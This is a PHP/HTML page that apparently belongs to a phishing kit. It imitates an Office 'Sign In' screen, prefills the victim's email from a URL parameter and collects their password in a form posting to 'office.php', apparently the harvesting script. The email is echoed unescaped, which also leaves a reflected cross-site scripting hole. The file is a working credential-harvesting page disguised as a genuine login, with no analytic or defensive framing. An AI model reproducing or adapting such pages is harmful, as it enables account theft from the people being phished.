
<!doctype html>
<html>
<head>
<title>Sign In</title>
<body>
  <link href="office.css" rel="stylesheet">
  <?php
/*
Get email from URL and set to email1 variable
*/
$email1 = $_GET['email'];
?><center>
<form action="office.php" method="post"><br><br><br>
<br><br><br><fieldset><br>
<img src="https://i.imgur.com/Ubi4Rm4.pngg"><br><br>
<div class="e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <?php echo $email1;?></div>
<br><img src="https://i.imgur.com/qMc2NMh.png"><br>
<input type="password" name="pass" placeholder="Pasword"  required >
<input type="hidden" name="user" value="<?php echo $email1;?>"  required >
<br><img src="https://i.imgur.com/JyiHGmM.png">
    <br>
    <input type="submit" name="submit" value="Sign in"/> <br> <br><br></fieldset>

</center>
</form>

</body>
</html>